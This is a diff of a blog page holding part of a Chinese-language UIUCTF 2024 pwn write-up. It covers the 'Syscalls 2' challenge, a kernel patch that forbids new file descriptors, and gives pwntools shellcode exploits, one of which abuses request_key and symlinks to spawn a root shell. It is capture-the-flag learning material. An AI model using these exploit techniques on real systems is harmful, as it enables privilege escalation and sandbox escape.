rsi</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        xor rdx, rdx</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rdi, rax</span></span><br><span class="line"><span class="string">        mov rax, 327</span></span><br><span class="line"><span class="string">        mov r12, rsp</span></span><br><span class="line"><span class="string">        add r12, 0x50</span></span><br><span class="line"><span class="string">        mov r11, 0x50</span></span><br><span class="line"><span class="string">        push r11</span></span><br><span class="line"><span class="string">        push r12</span></span><br><span class="line"><span class="string">        mov rsi, rsp</span></span><br><span class="line"><span class="string">        mov rdx, 1</span></span><br><span class="line"><span class="string">        mov r10, -1</span></span><br><span class="line"><span class="string">        mov r8, 0</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        mov rax, 328</span></span><br><span class="line"><span class="string">        mov rdi, 1</span></span><br><span class="line"><span class="string">        syscall</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">    )</span><br><span class="line">    <span class="comment"># gdb.attach(r, '''</span></span><br><span class="line">    <span class="comment"># b *$rebase(0x12d6)'''</span></span><br><span class="line">    <span class="comment"># )</span></span><br><span class="line">    <span class="built_in">print</span>(shellcode)</span><br><span class="line">    r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></tbody></table></figure>
+
+<p>我知道可以用<code>shellcraft</code>来构造 shellcode，但我就爱自己写 XD。</p>
+<h2 id="Syscalls-2"><a href="#Syscalls-2" class="headerlink" title="Syscalls 2"></a>Syscalls 2</h2><h3 id="概况-4"><a href="#概况-4" class="headerlink" title="概况"></a>概况</h3><blockquote>
+<p>I made it harder ;)<br>Hint: It’s not a bug, it’s a feature!</p>
+<p>8 Solves</p>
+</blockquote>
+<p>exp 修改自 robbert1978。</p>
+<h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>这道题对内核做了patch：</p>
+<figure class="highlight diff"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">From 1470120abb93fb80ee0ac52feab611418ec957d7 Mon Sep 17 00:00:00 2001</span><br><span class="line">From: YiFei Zhu &lt;zhuyifei@google.com&gt;</span><br><span class="line">Date: Wed, 26 Jun 2024 19:39:11 -0700</span><br><span class="line">Subject: [PATCH] prctl: Add a way to prohibit file descriptor creation</span><br><span class="line"></span><br><span class="line">They are avoided by enforcing a failure when the kernel tries to</span><br><span class="line">allocate a free fd. To be extra extra safe, attempting to install</span><br><span class="line">an fd after the point of no return will panic.</span><br><span class="line"></span><br><span class="line">Child processes inherit the restriction just like seccomp.</span><br><span class="line"></span><br><span class="line">Signed-off-by: YiFei Zhu &lt;zhuyifei@google.com&gt;</span><br><span class="line"><span class="comment">---</span></span><br><span class="line"> fs/file.c                  | 7 +++++++</span><br><span class="line"> include/linux/sched.h      | 5 +++++</span><br><span class="line"> include/uapi/linux/prctl.h | 2 ++</span><br><span class="line"> kernel/fork.c              | 3 +++</span><br><span class="line"> kernel/sys.c               | 3 +++</span><br><span class="line"> 5 files changed, 20 insertions(+)</span><br><span class="line"></span><br><span class="line"><span class="comment">diff --git a/fs/file.c b/fs/file.c</span></span><br><span class="line"><span class="comment">index 3b683b9101d8..d9562f8bca85 100644</span></span><br><span class="line"><span class="comment">--- a/fs/file.c</span></span><br><span class="line"><span class="comment">+++ b/fs/file.c</span></span><br><span class="line"><span class="meta">@@ -503,6 +503,9 @@</span> static int alloc_fd(unsigned start, unsigned end, unsigned flags)</span><br><span class="line"> 	int error;</span><br><span class="line"> 	struct fdtable *fdt;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+	if (task_uiuctf_no_fds_allowed(current))</span></span><br><span class="line"><span class="addition">+		return -EPERM;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> 	spin_lock(&amp;files-&gt;file_lock);</span><br><span class="line"> repeat:</span><br><span class="line"> 	fdt = files_fdtable(files);</span><br><span class="line"><span class="meta">@@ -604,6 +607,10 @@</span> void fd_install(unsigned int fd, struct file *file)</span><br><span class="line"> 	struct files_struct *files = current-&gt;files;</span><br><span class="line"> 	struct fdtable *fdt;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+	if (task_uiuctf_no_fds_allowed(current))</span></span><br><span class="line"><span class="addition">+		panic("Installing fds is actually not allowed and "</span></span><br><span class="line"><span class="addition">+		      "I'm not trying to hide a bypass");</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> 	if (WARN_ON_ONCE(unlikely(file-&gt;f_mode &amp; FMODE_BACKING)))</span><br><span class="line"> 		return;</span><br><span class="line"> </span><br><span class="line"><span class="comment">diff --git a/include/linux/sched.h b/include/linux/sched.h</span></span><br><span class="line"><span class="comment">index 3c2abbc587b4..f4584022dc4c 100644</span></span><br><span class="line"><span class="comment">--- a/include/linux/sched.h</span></span><br><span class="line"><span class="comment">+++ b/include/linux/sched.h</span></span><br><span class="line"><span class="meta">@@ -1698,6 +1698,8 @@</span> static __always_inline bool is_percpu_thread(void)</span><br><span class="line"> #define PFA_SPEC_IB_FORCE_DISABLE	6	/* Indirect branch speculation permanently restricted */</span><br><span class="line"> #define PFA_SPEC_SSB_NOEXEC		7	/* Speculative Store Bypass clear on execve() */</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#define PFA_UIUCTF_NO_FDS_ALLOWED	10</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #define TASK_PFA_TEST(name, func)					\</span><br><span class="line"> 	static inline bool task_##func(struct task_struct *p)		\</span><br><span class="line"> 	{ return test_bit(PFA_##name, &amp;p-&gt;atomic_flags); }</span><br><span class="line"><span class="meta">@@ -1739,6 +1741,9 @@</span> TASK_PFA_CLEAR(SPEC_IB_DISABLE, spec_ib_disable)</span><br><span class="line"> TASK_PFA_TEST(SPEC_IB_FORCE_DISABLE, spec_ib_force_disable)</span><br><span class="line"> TASK_PFA_SET(SPEC_IB_FORCE_DISABLE, spec_ib_force_disable)</span><br><span class="line"> </span><br><span class="line"><span class="addition">+TASK_PFA_TEST(UIUCTF_NO_FDS_ALLOWED, uiuctf_no_fds_allowed)</span></span><br><span class="line"><span class="addition">+TASK_PFA_SET(UIUCTF_NO_FDS_ALLOWED, uiuctf_no_fds_allowed)</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> static inline void</span><br><span class="line"> current_restore_flags(unsigned long orig_flags, unsigned long flags)</span><br><span class="line"> {</span><br><span class="line"><span class="comment">diff --git a/include/uapi/linux/prctl.h b/include/uapi/linux/prctl.h</span></span><br><span class="line"><span class="comment">index 370ed14b1ae0..6075c202ca43 100644</span></span><br><span class="line"><span class="comment">--- a/include/uapi/linux/prctl.h</span></span><br><span class="line"><span class="comment">+++ b/include/uapi/linux/prctl.h</span></span><br><span class="line"><span class="meta">@@ -306,4 +306,6 @@</span> struct prctl_mm_map {</span><br><span class="line"> # define PR_RISCV_V_VSTATE_CTRL_NEXT_MASK	0xc</span><br><span class="line"> # define PR_RISCV_V_VSTATE_CTRL_MASK		0x1f</span><br><span class="line"> </span><br><span class="line"><span class="addition">+#define PRCTL_UIUCTF_NO_FDS_ALLOWED 100</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> #endif /* _LINUX_PRCTL_H */</span><br><span class="line"><span class="comment">diff --git a/kernel/fork.c b/kernel/fork.c</span></span><br><span class="line"><span class="comment">index aebb3e6c96dc..692c01b13c9a 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/fork.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/fork.c</span></span><br><span class="line"><span class="meta">@@ -2559,6 +2559,9 @@</span> __latent_entropy struct task_struct *copy_process(</span><br><span class="line"> 	 */</span><br><span class="line"> 	copy_seccomp(p);</span><br><span class="line"> </span><br><span class="line"><span class="addition">+	if (task_uiuctf_no_fds_allowed(current))</span></span><br><span class="line"><span class="addition">+		task_set_uiuctf_no_fds_allowed(p);</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> 	init_task_pid_links(p);</span><br><span class="line"> 	if (likely(p-&gt;pid)) {</span><br><span class="line"> 		ptrace_init_task(p, (clone_flags &amp; CLONE_PTRACE) || trace);</span><br><span class="line"><span class="comment">diff --git a/kernel/sys.c b/kernel/sys.c</span></span><br><span class="line"><span class="comment">index 8bb106a56b3a..5bb16543a565 100644</span></span><br><span class="line"><span class="comment">--- a/kernel/sys.c</span></span><br><span class="line"><span class="comment">+++ b/kernel/sys.c</span></span><br><span class="line"><span class="meta">@@ -2760,6 +2760,9 @@</span> SYSCALL_DEFINE5(prctl, int, option, unsigned long, arg2, unsigned long, arg3,</span><br><span class="line"> 	case PR_RISCV_V_GET_CONTROL:</span><br><span class="line"> 		error = RISCV_V_GET_CONTROL();</span><br><span class="line"> 		break;</span><br><span class="line"><span class="addition">+	case PRCTL_UIUCTF_NO_FDS_ALLOWED:</span></span><br><span class="line"><span class="addition">+		task_set_uiuctf_no_fds_allowed(current);</span></span><br><span class="line"><span class="addition">+		break;</span></span><br><span class="line"> 	default:</span><br><span class="line"> 		error = -EINVAL;</span><br><span class="line"> 		break;</span><br><span class="line"><span class="deletion">-- </span></span><br><span class="line">2.45.1</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+<p>题目自定义了一个系统调用，程序调用<code>prctl(PRCTL_UIUCTF_NO_FDS_ALLOWED)</code>后，会阻止<code>alloc_fd()</code>和<code>fd_install()</code>正常运行，并且在对<code>copy_process()</code>的修改中使得<code>fork</code>的子程序会继承这一属性。因此预期解是使用<code>io_uring</code>来读 flag：</p>
+<ol>
+<li><code>io_uring</code>本身不需要一个新的 fd</li>
+<li><code>io_uring</code>管理了自己的 fd 表，不会触发<code>alloc_fd</code>和<code>fd_install</code></li>
+</ol>
+<h3 id="攻击思路-3"><a href="#攻击思路-3" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>但是我更喜欢非预期解：</p>
+<p>首先需要理解<code>request_key</code>系统调用。参考<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man2/request_key.2.html">manpage</a>，用法如下：</p>
+<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">key_serial_t</span> <span class="title function_">request_key</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *type, <span class="type">const</span> <span class="type">char</span> *description,</span></span><br><span class="line"><span class="params">							<span class="type">const</span> <span class="type">char</span> *_Nullable callout_info,</span></span><br><span class="line"><span class="params">							<span class="type">key_serial_t</span> dest_keyring)</span>;</span><br></pre></td></tr></tbody></table></figure>
+
+<blockquote>
+<p>If the kernel cannot find a key matching type and description, and callout is not NULL, then the kernel attempts to invoke a user-space program to instantiate a key with the given type and description.  In this case, the following steps are performed:<br>…<br>    (3)  The kernel creates a process that executes a user-space service such as request-key(8) with a new session keyring that contains a link to the authorization key, V. This program is supplied with the following command-line arguments:</p>
+<p>​		[0]  The string “/sbin/request-key”.</p>
+</blockquote>
+<p>也就是说，当我们指定的<code>type</code>和<code>description</code>能让内核无法找到对应的<code>key</code>，它就会运行<code>/sbin/request-key</code></p>
+<p>非预期解的思路是：</p>
+<ol>
+<li>将<code>/sbin/request_key</code>设为<code>/init</code>的符号链接</li>
+<li>将<code>/chal</code>设置为<code>/bin/bash</code>的符号链接</li>
+<li>使用系统调用<code>request_key</code>，并传入内核无法识别的<code>type</code>和<code>description</code></li>
+<li><code>request_key</code>将调用<code>/sbin/rquest-key-&gt;/init</code>，新的<code>/init</code>不会有<code>no_fds</code>的过滤</li>
+<li><code>/init</code>执行<code>exec /chal-&gt;/bin/bash</code>，弹出 shell</li>
+</ol>
+<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span></span><br><span class="line">shellcode = asm(<span class="string">"""</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lea rdi, [rip + offset init]</span></span><br><span class="line"><span class="string">    lea rsi, [rip + offset request_key]</span></span><br><span class="line"><span class="string">    mov eax, 0x58</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lea rdi, [rip + offset chal]</span></span><br><span class="line"><span class="string">    mov eax, 0x57</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lea rdi, [rip + offset bash]</span></span><br><span class="line"><span class="string">    lea rsi, [rip + offset chal]</span></span><br><span class="line"><span class="string">    mov eax, 0x58</span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    lea rdi, [rip + offset a]</span></span><br><span class="line"><span class="string">    lea rsi, [rip + offset b]</span></span><br><span class="line"><span class="string">    lea rdx, [rip + offset c]  </span></span><br><span class="line"><span class="string">    mov r10, 0xfffffffd </span></span><br><span class="line"><span class="string">    mov rax, 0xf9       </span></span><br><span class="line"><span class="string">    </span></span><br><span class="line"><span class="string">    syscall</span></span><br><span class="line"><span class="string">    ret</span></span><br><span class="line"><span class="string">a:</span></span><br><span class="line"><span class="string">    .asciz "user"</span></span><br><span class="line"><span class="string">b:</span></span><br><span class="line"><span class="string">    .asciz "BeaCox:nonsense"</span></span><br><span class="line"><span class="string">c:</span></span><br><span class="line"><span class="string">    .asciz "payload:data"</span></span><br><span class="line"><span class="string">init:</span></span><br><span class="line"><span class="string">    .asciz "/init"</span></span><br><span class="line"><span class="string">chal:</span></span><br><span class="line"><span class="string">    .asciz "/chal"</span></span><br><span class="line"><span class="string">request_key:</span></span><br><span class="line"><span class="string">    .asciz "/sbin/request-key"</span></span><br><span class="line"><span class="string">bash:</span></span><br><span class="line"><span class="string">    .asciz "/bin/bash"</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">"""</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(shellcode.<span class="built_in">hex</span>())</span><br></pre></td></tr></tbody></table></figure>
+
+
+  </div>
+  
+  
+    
+    <div class='footer'>
+       <!-- 参考资料、相关资料等 -->
+      
+       <!-- 相关文章 -->
+      
+      <!-- 版权声明组件 -->
+      
+        
+          
+          <div class="copyright license">
+            <div class="license-title">UIUCTF 2024 PWN Writeup</div>
+            <div class="license-link"><a href="https://blog.beacox.space/posts/uiuctf-2024-wp/">https://blog.beacox.space/posts/uiuctf-2024-wp/</a>
+            </div>
+            <div class="license-meta">
+              <div class="license-meta-item">
+                <div class="license-meta-title">本文作者</div>
+                <div class="license-meta-text">BeaCox</div>
+              </div>
+              <div class="license-meta-item">
+                <div class="license-meta-title">发布于</div>
+                <div class="license-meta-text">2024年7月7日</div>
+              </div>
+              
+              
+              <div class="license-meta-item">
+                <div class="license-meta-title">许可协议</div>
+                <div class="license-meta-text"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh#" target="_blank">CC BY-NC-SA 4.0</a></div>
+              </div>
+            </div>
+            <div class="license-statement">本文遵循CC BY-NC-SA 4.0协议。</div>
           </div>
         
       
-    
-  </section>
+      <!-- 打赏组件 -->
+      
+    </div>
+  
   
     
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
+          
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' href="/" rel="nofollow">
+    <img itemprop="image" src="/img/avatar.png" class="lazyload" data-srcset="/img/avatar.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">BeaCox</p>
+  </a>
+</div>
+
+        
+      
+        
+          
+  
+  
+  
+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/PWN/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>PWN</p></a></div>
+  <span hidden itemprop="keywords">PWN</span>
   
 
 
+        
+      
+        
+          
+
+
+<div class="new-meta-item browse">
+  <a class='notlink'>
+    <p>
+      <i class="fas fa-eye fa-fw" aria-hidden="true"></i>
+      
+      <span id="artalk_visitors" data-page-key="/posts/uiuctf-2024-wp/">
+        <i class="fa-light fa-loader fa-spin fa-fw" aria-hidden="true"></i>
+      </span>
+        
+      <span>浏览</span>
+    </p>
+  </a>
+</div>
+
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
     
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://blog.beacox.space/posts/uiuctf-2024-wp/&title=UIUCTF 2024 PWN Writeup - BeaCox&summary="
+          
+          >
+          
+            <img src="https://static.beacox.space/volantis-static/media/org.volantis/logo/128/qq.png" class="lazyload" data-srcset="https://static.beacox.space/volantis-static/media/org.volantis/logo/128/qq.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://blog.beacox.space/posts/uiuctf-2024-wp/&title=UIUCTF 2024 PWN Writeup - BeaCox&summary="
+          
+          >
+          
+            <img src="https://static.beacox.space/volantis-static/media/org.volantis/logo/128/qzone.png" class="lazyload" data-srcset="https://static.beacox.space/volantis-static/media/org.volantis/logo/128/qzone.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=https://blog.beacox.space/posts/uiuctf-2024-wp/&title=UIUCTF 2024 PWN Writeup - BeaCox&summary="
+          
+          >
+          
+            <img src="https://static.beacox.space/volantis-static/media/org.volantis/logo/128/weibo.png" class="lazyload" data-srcset="https://static.beacox.space/volantis-static/media/org.volantis/logo/128/weibo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+      
+    
+      
+        <a class="-mob-share-telegram" title="" rel="external nofollow noopener noreferrer noopener"
+          
+            target="_blank" href="https://t.me/share/url?url=https://blog.beacox.space/posts/uiuctf-2024-wp/&text=UIUCTF 2024 PWN Writeup - BeaCox"
+          
+          >
+          
+            <img src="https://static.beacox.space/volantis-static/media/org.volantis/logo/128/telegram.png" class="lazyload" data-srcset="https://static.beacox.space/volantis-static/media/org.volantis/logo/128/telegram.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+    <!-- Custom Files bottomMeta begin -->
+    
+    <!-- Custom Files bottomMeta end -->
+  </div>
+
+
   
+  
+
+  
+    <div class="prev-next">
+      
+      
+        <a class='next' href='/posts/fini_array/'>
+          <p class='title'>从 pwnable.tw——3x17 学习 .fini_array<i class="fa-solid fa-chevron-right" aria-hidden="true"></i></p>
+          <p class='content'>尽管 pwnable.tw已经很久没更新新题，这上面的题目放到现在对我而言也仍然是很有趣的。在解 3x17 这道题的时候，用到了之前从没用过的 fini_array hijack，因此记录一下。...</p>
+        </a>
+      
+    </div>
+  
+  <!-- 文章推荐 -->
+  
+  
+  <!-- Custom Files postEnd begin-->
+  
+  <!-- Custom Files postEnd end-->
+</article>
+
+
+  
+
+
+  <article class="post white-box shadow" id="comments">
+    <span hidden>
+      <meta itemprop="discussionUrl" content="/posts/uiuctf-2024-wp/index.html#comments">
+    </span>
+    <p ct><i class='fa-duotone light-blue fa-comments'></i> 评论</p>
+    
+
+    <div id="layoutHelper-comments"></div>
+
+  </article>
+
+
+
+
+
+
 </div>
 <aside id='l_side' itemscope itemtype="http://schema.org/WPSideBar">
   
@@ -3176,101 +3625,31 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     
     
       
-
-<section class="widget desktop">
-  
-  <header>
-    
-      <i class="fa-duotone fa-clock PETERRIVE fa-fw" aria-hidden="true"></i><span class='name'>最近更新</span>
-    
-  </header>
-
-
-  <div class='content'>
-    <ul class="list entry navigation"><li><a class="widget-last" href="/posts/uiuctf-2024-wp/"><div class="item"><time>2024-07-07</time><span>CTF</span></div><span>UIUCTF 2024 PWN Writeup</span></a></li><li><a class="widget-last" href="/posts/fini_array/"><div class="item"><time>2024-06-19</time><span>CTF</span></div><span>从 pwnable.tw——3x17 学习 .fini_array</span></a></li><li><a class="widget-last" href="/posts/ciscn-2024-wp/"><div class="item"><time>2024-05-20</time><span>CTF</span></div><span>第十七届全国大学生信息安全竞赛创新实践能力赛初赛 Writeup</span></a></li><li><a class="widget-last" href="/posts/tbtlctf-2024-wp/"><div class="item"><time>2024-05-13</time><span>CTF</span></div><span>TBTL CTF 2024 WriteUp</span></a></li><li><a class="widget-last" href="/posts/TINY-Scanner/"><div class="item"><time>2024-05-13</time><span>项目</span></div><span>TINY Scanner开发文档</span></a></li></ul>
-  </div>
-</section>
-
-    
-  
-
-  
-    
-    
-      
-  
-  <section class="widget tagcloud desktop">
-    
-  <header>
-    
-      <a href='/tags/'><i class="fas fa-tags WISTERIA fa-fw" aria-hidden="true"></i><span class='name'>标签云</span></a>
-    
-  </header>
-
-
-    <div class='content'>
-      <a href="/tags/fini-array/" style="font-size: 12px; color: #999">.fini_array</a> <a href="/tags/2D/" style="font-size: 12px; color: #999">2D</a> <a href="/tags/ASLR/" style="font-size: 12px; color: #999">ASLR</a> <a href="/tags/Actions/" style="font-size: 15px; color: #888">Actions</a> <a href="/tags/C/" style="font-size: 12px; color: #999">C</a> <a href="/tags/CSAPP/" style="font-size: 12px; color: #999">CSAPP</a> <a href="/tags/Crypto/" style="font-size: 15px; color: #888">Crypto</a> <a href="/tags/Docker/" style="font-size: 12px; color: #999">Docker</a> <a href="/tags/GitHub/" style="font-size: 15px; color: #888">GitHub</a> <a href="/tags/Markdown/" style="font-size: 15px; color: #888">Markdown</a> <a href="/tags/Misc/" style="font-size: 18px; color: #777">Misc</a> <a href="/tags/PWN/" style="font-size: 24px; color: #555">PWN</a> <a href="/tags/PoC/" style="font-size: 12px; color: #999">PoC</a> <a href="/tags/ROP/" style="font-size: 12px; color: #999">ROP</a> <a href="/tags/Reverse/" style="font-size: 18px; color: #777">Reverse</a> <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" style="font-size: 21px; color: #666">SQL注入</a> <a href="/tags/ShareX/" style="font-size: 12px; color: #999">ShareX</a> <a href="/tags/Web/" style="font-size: 12px; color: #999">Web</a> <a href="/tags/Windows/" style="font-size: 12px; color: #999">Windows</a> <a href="/tags/javascript/" style="font-size: 15px; color: #888">javascript</a> <a href="/tags/npm/" style="font-size: 12px; color: #999">npm</a> <a href="/tags/python/" style="font-size: 12px; color: #999">python</a> <a href="/tags/shell/" style="font-size: 12px; color: #999">shell</a> <a href="/tags/shellcode/" style="font-size: 12px; color: #999">shellcode</a> <a href="/tags/shields/" style="font-size: 12px; color: #999">shields</a> <a href="/tags/%E5%BC%80%E6%BA%90/" style="font-size: 12px; color: #999">开源</a> <a href="/tags/%E6%8E%A8%E7%90%86/" style="font-size: 12px; color: #999">推理</a> <a href="/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/" style="font-size: 18px; color: #777">杂七杂八</a> <a href="/tags/%E6%B2%99%E7%AE%B1/" style="font-size: 12px; color: #999">沙箱</a> <a href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/" style="font-size: 12px; color: #999">沙箱逃逸</a> <a href="/tags/%E6%B5%B7%E6%8A%A5/" style="font-size: 12px; color: #999">海报</a> <a href="/tags/%E7%AB%9E%E8%B5%9B/" style="font-size: 12px; color: #999">竞赛</a> <a href="/tags/%E7%B3%BB%E7%BB%9F/" style="font-size: 12px; color: #999">系统</a> <a href="/tags/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86/" style="font-size: 12px; color: #999">编译原理</a> <a href="/tags/%E7%BE%8E%E5%8C%96/" style="font-size: 12px; color: #999">美化</a> <a href="/tags/%E8%8A%82%E6%97%A5/" style="font-size: 12px; color: #999">节日</a> <a href="/tags/%E8%AE%BE%E8%AE%A1/" style="font-size: 15px; color: #888">设计</a> <a href="/tags/%E9%9A%90%E7%A7%81%E8%AE%A1%E7%AE%97/" style="font-size: 12px; color: #999">隐私计算</a>
-    </div>
-  </section>
-
-
-    
-  
-
-  
-    
-    
-      
-<section class="widget desktop">
-  
-  <header>
-    
-      <i class="fa-duotone fa-award EMERALD fa-fw" aria-hidden="true"></i><span class='name'>站点信息</span>
-    
-  </header>
-
-
-  <div class='content'>
-    <div class="webinfo">
-      
-        <div class="webinfo-item">
-          <div>文章数目：</div>
-          <div>29 篇</div>
-        </div>
-      
-
-      
-        <div class="webinfo-item">
-          <div>已运行时间：</div>
-          <div id="webinfo-runtime-count"></div>
-        </div>
-      
-
-
-      
-        <div class="webinfo-item">
-          <div>本站总字数：</div>
-          <div>54.8k 字</div>
-        </div>
-      
-
-      
-
-      
-        <div class="webinfo-item">
-          <div>最后更新时间：</div>
-          <div id="last-update-show">2024-07-07 日</div>
-        </div>
-      
-    </div>
-  </div>
-</section>
-
     
   
 
 
 <div class="widget-sticky">
+
+  
+  
+
+
+<section class="widget toc-wrapper desktop mobile" id="toc-div" >
+  
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>目录</span>
